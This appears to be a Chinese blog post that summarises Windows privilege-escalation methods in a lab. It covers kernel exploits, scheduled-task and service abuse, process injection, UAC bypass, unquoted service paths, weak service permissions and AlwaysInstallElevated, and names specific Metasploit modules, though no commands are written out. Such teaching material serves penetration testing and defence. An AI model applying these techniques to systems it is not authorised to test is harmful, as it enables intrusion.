Windows提权方式总结

本文最后更新于：October 22, 2021 pm

系统内核溢出漏洞提权

目标系统本身存在一些未打相应补丁的内核溢出漏洞，可利用该漏洞来进行提权

收集系统的补丁信息

寻找EXP

在进行目标系统的信息收集之后，可以利用工具MSF（Metasploit Framework）或者CS（Cobalt Strike）进行提权，此外，有些EXP未集成在这两款工具之上，那么可以在网上寻找EXP

计划任务提权

at命令

在老版本的Windows系统里，可以使用at命令来创建一个计划任务，该计划任务会创建一个交互式的cmd窗口，权限为system

测试环境，Windows Server 2003 R2

schtasks命令

Win7以及之后的系统中，微软使用schtasks替换了at命令

SC命令

SC命令是用来与服务控制管理器和服务进行通信的命令行程序

测试环境，Windows Server 2003 R2

Psexec

PsExec 是一种轻量级的telnet替代品，可让您在其他系统上执行进程，并与控制台应用程序完全交互，而无需手动安装客户端软件

测试环境，Windows Server 2008 R2

进程注入

pinjextor

Pinjector 是一种安全工具，允许用户在其他用户的上下文中执行应用程序，此工具在渗透测试中最常使用，以将代码注入已记录的管理员或域管理员进程，并使用其凭据生成 shell下载地址：https://www.tarasco.org/security/Process_Injector/

测试环境，Windows Server 2003 R2

Bypass UAC

UAC（UserAccount Control，用户账户控制），是微软在Vista及更高版本windows系统中通过弹框进一步让用户确认是否授权当前可执行文件来达到阻止恶意程序的目的

环境

msf Win 10：192.168.199.123

被攻击主机 Win 7：192.168.199.130

设置UAC

在Win 7中，[开始]菜单，输入”UAC”，点击”更改用户账户控制设置”，默认选项即为打开UAC

在有UAC的存在，提权会变得困难，例如，在我们拿到了Win 7的权限，使用msf的自动提权会出现错误

在MSF中，我们用到以下模块来进行Bypass UAC，如果遇到不能使用的情况，可以多换几个模块来试试，使用时注意设置target对应操作系统的型号

这里使用exploit/windows/local/ask做为演示

可信任服务路径提权

环境

msf Win 10：192.168.199.123

被攻击主机 Windows Server 2008 R2：192.168.199.205

漏洞原理介绍

Windows在启动服务对应的二进制文件时，对于该路径中的每一个空格，Windwos都会尝试寻找并执行与空格前面的名字相匹配的程序，例如”C:\Program Files\Unicode.exe”，Windows会依次尝试确定和执行以下程序：

  • C:\Program.exe
  • C:\Program Files\Unicode.exe

可信任服务路径漏洞

创建vulservice服务，对应的二进制执行文件路径为C:\Program Files\Unicode.exe

使用win+r，输入”services.msc”打开服务，可以看到刚才添加的服务

msf构造恶意payload，启动监听

启动该服务，msf上线

系统权限配置提权

环境

msf Win 10：192.168.199.123

被攻击主机 Windows Server 2008 R2：192.168.199.205

漏洞原理介绍

Windows系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件，Windows服务是以system权限运行的，因此，当一个低权限用户对此类系统服务调用的可执行文件有写权限，就可以将该文件替换为任意可执行文件，并随着系统服务的启动获得系统权限

MSF利用

利用msf中的windows/local/service_permissions模块可以对目标主机进行该漏洞的检测和利用，设置session即可

注册表键AlwaysInstallElevated提权

环境

msf Win 10：192.168.199.123

被攻击主机 Windows Server 2008 R2：192.168.199.205

漏洞原理介绍

用户开启了Windows Installer特权安装功能，开启该选项，低权限用户在安装.msi文件时会以system权限进行安装

复现

使用win+r，输入”gpedit.msc”打开组策略编辑器

  • 计算机配置-管理模板-Windwos组件-Windows Installer-永远以高特权进行安装-选择”已启用”
  • 用户配置-管理模板-Windwos组件-Windows Installer-永远以高特权进行安装-选择”已启用”

使用msf的windows/local/always_install_elevated模块进行提权
